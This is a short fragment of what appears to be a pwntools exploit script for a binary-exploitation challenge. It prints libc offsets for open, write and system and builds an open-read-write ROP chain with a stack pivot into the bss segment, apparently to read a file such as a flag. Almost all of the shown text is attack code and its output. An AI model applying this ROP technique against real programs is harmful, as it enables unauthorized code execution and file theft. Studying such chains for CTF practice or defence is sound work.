...
print('open_addr',hex(libc.sym['open']))
print('write_addr',hex(libc.sym['write']))
print('system_addr',hex(libc.sym['system']))
'''
open_addr 0x10dce0
write_addr 0x10e060
system_addr 0x52290
...
orw_rop=flat([pop_rdi,bss-0x100+0xf0,pop_rsi_r15,0,0,open_plt,pop_rbp,bss+0x50,leave_ret])
orw_rop=orw_rop.ljust(0x58,b'k')
orw_rop+=flat([pop_rdi,4,pop_rsi_r15,bss+0x40,0,read_plt,pop_rdi,1,pop_rsi_r15,bss+0x40,0,write_plt])
